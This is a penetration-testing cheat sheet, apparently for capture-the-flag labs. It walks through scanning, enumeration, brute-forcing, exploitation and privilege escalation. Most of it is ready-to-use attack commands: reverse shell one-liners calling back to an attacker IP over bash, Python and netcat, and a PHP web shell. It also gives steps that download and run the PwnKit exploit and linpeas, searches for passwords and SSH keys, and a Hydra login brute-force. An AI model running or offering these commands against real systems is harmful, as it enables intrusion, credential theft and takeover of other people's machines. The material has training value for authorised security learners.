---
date: "2025-08-29"
layout: "single"
hidemeta: true
---

**Host Discovery -> Scanning -> Gain Access/Exploit -> Survey -> PrivEsc -> Pivot**

# Scanning

## NMAP

Ref: https://linux.die.net/man/1/nmap

### Host Discovery: `-sn`

The `-sn` (skip port scan) option is a technique to quickly find live hosts. It avoids port scanning, which saves time and reduces network traffic.

```bash
sudo nmap -sn -oA host_disc
```

#### Default Probes

When run with `sudo`, Nmap sends the following probes **in parallel** to determine if a host is online:
* **ICMP Echo Request** (standard ping)
* **TCP SYN** to port 443
* **TCP ACK** to port 80
* **ICMP Timestamp Request**
* **ARP Requests** local networks only (checked via routing table and network interfaces with subnet match); VERY reliable; force ARP `-PA` vs. force IP-only `--send-ip`

You can use `-P*` flags (e.g., `-PE`, `-PS`, `-PA`) to add different probes. Using these flags will override the default probes and allow for greater flexibility against strict firewalls.

### TCP Normal: `-sT`/`-sS`

- open: SYN/ACK received
- filtered: nothing or FAKE RST received
- closed: RST received

### TCP Malformed Scans

Typically, malformed scans are useful as followup scans (after a -sT/-sS/-sU) because  the OS can be fingerprinted. Typically, if everything is "filtered" (aka no response), these scans might elucidate more info (assuming no modern firewall or IDS is present).

**NOTE:** against malformed scans (below)

| OS / Device        | Behavior with malformed TCP packets (NULL/FIN/Xmas) | Notes |
|--------------------|-----------------------------------------------------|-------|
| **Unix/Linux (RFC-compliant)** | - **Open port** → No response<br>- **Closed port** → RST sent | Matches RFC 793, used by Nmap to infer open vs. closed ports |
| **Windows (all modern versions)** | Always sends RST, regardless of port state | Breaks RFC; all ports appear **closed** during NULL/FIN/Xmas scans |
| **Cisco devices** | Typically send RST to any malformed packet | Similar to Windows; non-RFC-compliant |
| **IBM OS/400 & some others** | Respond with RST to all malformed probes | Causes false “closed” results |
| **Firewalls / IDS/IPS** | Often drop malformed probes silently | Can cause ports to appear **filtered** instead |

#### Null: `-sN`

TCP scan with **no** TCP flags set

- open|filtered: nothing
- filtered: ICMP: Port unreachable
- closed: RST received

#### Fin: `-sF`

TCP scan with **only** FIN flag set; FIN is meant to gracefully close a session
- open|filtered: nothing
- filtered: ICMP: Port unreachable
- closed: RST received

#### Xmas: `-sX`

TCP scan with **all** flags FIN/PSH/URG flags set
- open|filtered: nothing
- filtered: ICMP: Port unreachable
- closed: RST received

### UDP: `-sU`

```bash
sudo nmap -sU --top-ports 20  # UDP is slow and unreliable
```

- open: response from the service
- open|filtered: nothing
- closed: ICMP: Port unreachable

### Nmap Scripting Engine (NSE)

Ref: https://nmap.org/book/nse-usage.html

#### How to Use NSE

* Use the `-sC` option to run a set of popular, common scripts.
* Use the `--script` option to run specific scripts by name, category, or file path. You can also combine them with wildcards (e.g., `--script "smb-*,http-*"`)
* Scripts can be customized with arguments using the `--script-args` option by reading `--script-help`
    * https://nmap.org/nsedoc/scripts/ is more comprehensive than `--script-help`
    * `grep "ftp" /usr/share/nmap/scripts/script.db`

```bash
nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' <TARGET>
```

#### Script Categories

| Category | Description |
| :--- | :--- |
| **auth** | Scripts related to authentication, such as bypassing credentials or checking for default ones. |
| **broadcast** | Used to discover hosts on the local network by broadcasting requests. |
| **brute** | Scripts that perform brute-force attacks to guess passwords or credentials. |
| **default** | The core set of scripts that are run automatically with `-sC` or `-A`. |
| **discovery** | Actively gathers more information about a network, often using public registries or protocols like SNMP. |
| **dos** | Tests for vulnerabilities that could lead to a denial-of-service attack. |
| **exploit** | Actively attempts to exploit known vulnerabilities on a target system. |
| **external** | Interacts with external services or databases. |
| **fuzzer** | Sends unexpected or randomized data to a service to find bugs or vulnerabilities. |
| **intrusive** | These scripts can be noisy, resource-intensive, or potentially crash the target system. |
| **malware** | Scans for known malware or backdoors on a target host. |
| **safe** | Scripts that are considered safe to run as they are not designed to crash services, use excessive resources, or exploit vulnerabilities. |
| **version** | Extends the functionality of Nmap's version detection feature. |
| **vuln** | Checks a target for specific, known vulnerabilities. |

#### Install New Script

```bash
sudo wget --output-file /usr/share/nmap/scripts/<SCRIPT>.nse \
    https://svn.nmap.org/nmap/scripts/<SCRIPT>.nse

nmap --script-updatedb
```

### Example Scans

```bash
# Comprehensive scan with scripts, versioning, and OS detection
sudo nmap -Pn -n -sC -sV -O -T4 -oA nmap_scan <target_ip>

# Basic SYN scan against the top 5000 ports
sudo nmap -Pn -sS -p-5000 -oA syn_scan <target_ip>

# TCP connect scan against a single port (e.g., 80)
sudo nmap -Pn -sT -p 80 -oA tcp_conn_80 <target_ip>

# Xmas scan, assuming host is up, on the first 999 ports
sudo nmap -Pn -sX -p-999 -oA xmas_scan <target_ip>

# ICMP echo ping scan to check if a host is up
sudo nmap -sn -PE <target_ip>

# TCP SYN ping on port 443 to check if a host is up
nmap --disable-arp-ping -PS <target_ip>

# Check for anonymous FTP login
sudo nmap -Pn --script ftp-anon <target_ip>

# Scan SMB ports for information and vulnerabilities
nmap -p 137,139,445 --script nbstat,smb-os-discovery,smb-enum-shares,smb-enum-users <target_ip>
```

## SMB / Enum4linux

```bash
# Perform a full enumeration of a target using enum4linux
enum4linux -a <TARGET>

# List available SMB shares for a given host
smbclient -L //<TARGET>/ -U <USERNAME>

# Connect to an SMB share with a null session (no password)
smbclient -N //<TARGET>/<SHARE>
```

## Web

### Gobuster

```bash
# Directory brute-force with a common wordlist
gobuster dir --threads 20 --wordlist /usr/share/wordlists/dirb/common.txt --url <TARGET>

# Directory brute-force using a larger wordlist and showing expanded URLs
gobuster dir --output gobuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url <TARGET>
```

### Wpscan

```bash
# Enumerate Wordpress users
wpscan --url http://<USER>/ --enumerate u

# Brute-force creds
2025-08-19 18:26:03 -- wpscan --url http://<TARGET>/ --passwords <PASSWORDS_FILE> --usernames <USERS_FILE> --password-attack wp-login
```

# URL Encode String

```bash
echo '<COMMAND>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))'
```

### Interacting with Web Servers using cURL
```bash
# Fetch a webpage's content to standard output
curl -o- <TARGET>

# Fetch only the HTTP headers of a webpage
curl -I <TARGET>

# Attempt to upload a file to a web server
curl --upload-file <PHP_FILE> <TARGET>/<FILENAME>

# Execute a command via a webshell parameter, ensuring the command is URL encoded
curl -o- 'http://<TARGET>/uploads/shell.phtml?cmd=ls%20-la'
```

# Exploitation

## Brute-Forcing

### Brute-Forcing Web & SSH Logins with Hydra
```bash
# Brute-force a web login form
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

# Brute-force a Wordpress login form with a complex request string
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username' -V

# Brute-force an SSH login for a specific user
hydra -t 4 -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET>:<PORT>
```

## Metasploit / Meterpreter

```bash
searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc'
```

### Finding and Executing Exploits
```bash
# Search for exploits related to a specific keyword
search type:exploit <KEYWORD>

# Set the target host(s) for the exploit
setg RHOSTS <TARGET>
setg PORT

# Set the payload for the exploit
set payload php/meterpreter/bind_tcp

# Run the configured exploit
run
```

## Reverse & Bind Shells

### Shell One-Liners

#### LISTENER

```bash
nc -vnlp <PORT>
```

#### CALLBACK Shells

```bash
# Simple bash reverse shell
bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1

# Python reverse shell
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Reverse shell using a named pipe (fifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI_IP> <PORT> > /tmp/f
```

### PHP Web Shells

#### Upload command executor
```php
<?php system($_GET['cmd']); ?>
```
#### Run commands
```bash
curl http://<TARGET>/cmd.php?cmd=echo 'hi there'
```

---

#### Start Listener
```bash
nc -lvnp 54321
```

#### Upload reverse shell to execute netcat
**MAKE SURE NETCAT IS ON TARGET**
```php
<?php
  $cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 54321 > /tmp/f";
  system($cmd);
?>
```

# Post-Exploitation

## Shell Upgrades

```bash
# Meterpreter
execute -f 'python -c "import pty; pty.spawn(\"/bin/bash\")"' -i -t

# Upgrade a simple shell to a more interactive PTY
python2 -c 'import pty; pty.spawn("/bin/sh")'
python2 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Stabilize a shell from terminal escape commands
stty raw -echo; fg
```

### Socat Shell Upgrade

```bash
# LOCAL: download and serve static socat
cd /tmp
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
ip a ; python3 -m http.server 8000
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>

# REMOTE: Use socat to connect back to the listener and spawn a shell
curl -o socat http://<KALI_IP>:8000/socat
chmod +x socat
./socat tcp-connect:<KALI_IP>:<PORT> exec:'bash -li',pty,stderr,setsid,sigint,sane
```

## Linux Survey

```bash
#!/bin/bash

# ===============================================================
# ===      FINAL, FOCUSED & ROBUST LINUX PRIV-ESC SURVEY      ===
# ===============================================================

# --- Configuration: Add binaries to ignore to these lists, separated by "|" ---
SUID_IGNORE_LIST="chsh|gpasswd|newgrp|chfn|passwd|sudo|su|ping|ping6|mount|umount|Xorg\.wrap|ssh-keysign"
SGID_IGNORE_LIST="wall|ssh-agent|mount|umount|utempter"

# --- Main Survey Execution ---
(
echo "===== WHO AM I? =====";
whoami; id; pwd; hostname;

echo -e "\n===== OS & KERNEL INFO =====";
uname -a;
cat /etc/issue;
cat /etc/os-release;

echo -e "\n===== INTERESTING SUID FILES (FILTERED) =====";
echo "Review this list carefully. Check GTFOBins for each binary: https://gtfobins.github.io/";
find / -perm -u=s -type f 2>/dev/null | grep -vE "/(${SUID_IGNORE_LIST})$";

echo -e "\n===== INTERESTING SGID FILES (FILTERED) =====";
find / -perm -g=s -type f 2>/dev/null | grep -vE "/(${SGID_IGNORE_LIST})$";

echo -e "\n===== LINUX CAPABILITIES (MODERN PRIVESC) =====";
echo "Check GTFOBins for any binary with '+ep' privileges.";
getcap -r / 2>/dev/null;

echo -e "\n===== WORLD-WRITABLE FILES & DIRECTORIES =====";
find / -type d -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null;
find / -type f -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null;

echo -e "\n===== DIRECTORY CONTENTS =====";
echo "--- Current Folder (from messy exploit) ---";
ls -la .;
echo "--- Root Filesystem ---";
ls -la /;
echo "--- Current User's Home (\$HOME) ---";
ls -la $HOME;
echo -e "\n--- All Users in /home ---";
for user_dir in /home/*; do
  if [ -d "${user_dir}" ]; then
    echo -e "\n[+] Contents of ${user_dir}:";
    ls -la "${user_dir}";
  fi
done;

echo -e "\n===== RUNNING PROCESSES =====";
ps aux;

echo -e "\n===== CRON JOBS / SCHEDULED TASKS =====";
ls -la /etc/cron*;
cat /etc/crontab;

echo -e "\n===== NETWORK INFO & OPEN PORTS (LOCAL) =====";
# Failsafe: Tries to use netstat, but falls back to ss if it's not available.
command -v netstat &>/dev/null && netstat -tulpn || ss -tulpn;

echo -e "\n===== CAN I RUN SUDO? (NON-INTERACTIVE CHECK) =====";
sudo -n -l;

echo -e "\n===== SENSITIVE CONTENT SEARCH (LAST - CAN BE NOISY) =====";
echo "--- id_rsa ---"
find /home -name "id_rsa*" 2>/dev/null;
echo "--- grep pass ---"
grep --color=auto -rni "password\|pass" /etc /var/www /home 2>/dev/null;

echo -e "\n===== SURVEY COMPLETE =====\n";

) 2>&1 | tee /tmp/linux_survey_output.txt
```

```bash
# Retrieve survey
scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linux_survey_output.txt /tmp/
```

## No Netstat nor SS

Sometimes, some routers or mini-environments might not have the full core utils suite. As long as `/proc/net` is readable, then it is also parsable with the following monstrosity.

### TCP and TCP6 Manual Netstat (no UDP)

```bash
{ printf "%-8s %-22s %-22s %-12s %s\n" "Proto" "Local Address" "Remote Address" "State" "PID/Program Name"; awk 'function hextodec(h,r,i,c,v){h=toupper(h);r=0;for(i=1;i<=length(h);i++){c=substr(h,i,1);if(c~/[0-9]/)v=c;else v=index("ABCDEF",c)+9;r=r*16+v}return r} function hextoip(h,ip,d1,d2,d3,d4){if(length(h)==8){d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return d1"."d2"."d3"."d4}if(length(h)>8){if(hextodec(h)==0)return"::";if(substr(h,1,24)=="0000000000000000FFFF0000"){h=substr(h,25,8);d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return"::ffff:"d1"."d2"."d3"."d4}return h}} NR>1{split($2,l,":");split($3,r,":");lip=hextoip(l[1]);lport=hextodec(l[2]);rip=hextoip(r[1]);rport=hextodec(r[2]);sm["01"]="ESTABLISHED";sm["0A"]="LISTEN";if($4 in sm){if(FILENAME~/tcp6/)p="tcp6";else p="tcp";printf"%-8s %-22s %-22s %-12s %s\n",p,lip":"lport,rip":"rport,sm[$4],$10}}' /proc/net/tcp /proc/net/tcp6 | while read proto laddr raddr state inode; do find_output=$(find /proc -path '*/fd/*' -lname "socket:\[$inode\]" -print -quit 2>/dev/null); if [ -n "$find_output" ]; then pid=$(echo "$find_output" | cut -d'/' -f3); pname=$(cat /proc/$pid/comm 2>/dev/null); printf "%-8s %-22s %-22s %-12s %s/%s\n" "$proto" "$laddr" "$raddr" "$state" "$pid" "$pname"; else printf "%-8s %-22s %-22s %-12s %s\n" "$proto" "$laddr" "$raddr" "$state" "-"; fi; done | sort -k4; }
```

## Privilege Escalation (PrivEsc)
```bash
# List your sudo privileges
sudo -l

# Find all files with SUID permission set
find / -perm -u=s -type f 2>/dev/null

# Upgrade to a root shell from vim (if sudo allows)
sudo vim -c ':!/bin/bash'
```

### Linpeas Enumerator

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/

```bash
# KALI
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
ip a
python3 -m http.server 8000

# TARGET
cd /tmp
wget http://<IP_ADDR>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh 2>&1 | tee linpeas_output.txt
```

```bash
# Retrieve survey
scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linpeas_output.txt /tmp/
```

### CVE-2021-4034 - Pkexec Local Privilege Escalation (privesc)
```bash
# LOCAL: Download and execute the PwnKit privesc
cd /tmp
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
ip a ; python3 -m http.server 8000

# REMOTE: Download and run privesc
curl -o PwnKit http://<KALI_IP>:8000/PwnKit
chmod +x PwnKit
./PwnKit
```

## SSH / SCP

### Connecting and Transferring Files
```bash
# SSH into a target using a password with sshpass (non-interactive)
sudo apt-get install -y sshpass
sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 <USER>@<TARGET>

# SSH into a target using a private key identity file
ssh -i /path/to/private_key <USER>@<TARGET>

# TARGET_FILE -> KALI
scp <USER>@<TARGET>:/remote/path/to/file /local/path/

# KALI_FILE -> TARGET
scp /local/path/to/file <USER>@<TARGET>:/remote/path/
```

## Password Cracking

### Cracking Hashes with John and Hashcat
```bash
# Convert an SSH private key to a hash format for John the Ripper
ssh2john /path/to/id_rsa > /path/to/hash.txt

# Crack a hash file using a wordlist with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt /path/to/hash.txt
```

```bash
# Crack an MD5crypt hash with a salt using Hashcat
hashcat -O -a 0 -m 20 <HASH>:<SALT> /usr/share/wordlists/rockyou.txt

# Crack a SHA512crypt hash using Hashcat
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

## MongoDB

### Interacting with the Database
```bash
# Connect to a MongoDB instance on a specific port
mongo --port 27117

# List all available databases
show dbs

# Switch to a specific database
use <DB_NAME>

# List all collections (tables) in the current database
show collections

# Find and display all documents (rows) in a collection
db.<COLLECTION>.find().pretty()

# Generate a SHA512crypt password hash to change password
openssl passwd -6 <PASSWORD>
db.admin.update({ "name" : "administrator" }, { $set: { "x_shadow" : "<HASH>" } });
```

# Resources

## Prep Commands

```bash
# Add HOST for local DNS resolution in /etc/hosts file
echo '<TARGET_IP> <TARGET_HOST>' | sudo tee -a /etc/hosts

# Decompress a gzipped file
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

## EZ Wins & Searching Info
```bash
# Use zbarimg to scan a QR code from an image file
sudo apt-get install -y zbar-tools
zbarimg <QR_CODE>

# Use ltrace to trace library calls of an executable
ltrace <EXE_FILE>

# Stegohide
steghide info <FILE>

# EXIF data
exiftool -a -G <FILE>

# Search for easy flags
sudo find / -type f \( -name "user.txt" -o -name "root.txt" -o -name "flag.txt" \) 2>/dev/null
```

## Run Python2 Scripts

```bash
# --- Step 1: Install Python 2 and its pip package manager ---
echo "[*] Ensuring python2 and pip2 are installed..."
sudo apt-get update
sudo apt-get install -y python2
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
echo "[+] Pip for Python 2 installed."

# --- Step 2: Upgrade pip and setuptools to prevent dependency errors ---
echo "[*] Upgrading pip and setuptools for Python 2..."
sudo python2 -m pip install --upgrade pip setuptools
echo "[+] Core packages upgraded."

# --- Step 3: Install virtualenv for Python 2 ---
echo "[*] Installing virtualenv for Python 2..."
sudo python2 -m pip install virtualenv
echo "[+] virtualenv installed."

# --- Step 4: Create the virtual environment using the failsafe method ---
echo "[*] Creating the Python 2 virtual environment in './py2-env'..."
python2 -m virtualenv py2-env
echo "[+] Environment 'py2-env' created successfully."

# --- Step 5: Provide instructions on how to activate and use the environment ---
echo -e "\n[!] SETUP COMPLETE. To use the environment, run the following commands:"
echo "    source py2-env/bin/activate"
echo "    pip install <required_packages>"
echo "    python <your_exploit.py>"
echo "    deactivate"
```

## Wordlists

### Web Directory & File Enumeration (Gobuster, ffuf)
*   **Best All-Around:** `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
*   **Fastest:** `/usr/share/seclists/Discovery/Web-Content/common.txt`
*   **Most Thorough:** `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`

### Password Cracking & Brute-Forcing (Hydra, John, Hashcat)
*   **Primary (Must-Use):** `/usr/share/wordlists/rockyou.txt`
    *   **Note:** Decompress first with `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`

### Subdomain Enumeration (ffuf, gobuster vhost)
*   **Best All-Around:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
*   **Fastest:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

### Username Enumeration
*   **General Shortlist:** `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
*   **Default Credentials:** `/usr/share/seclists/Usernames/cirt-default-usernames.txt`
*   **Common Names:** `/usr/share/seclists/Usernames/Names/names.txt`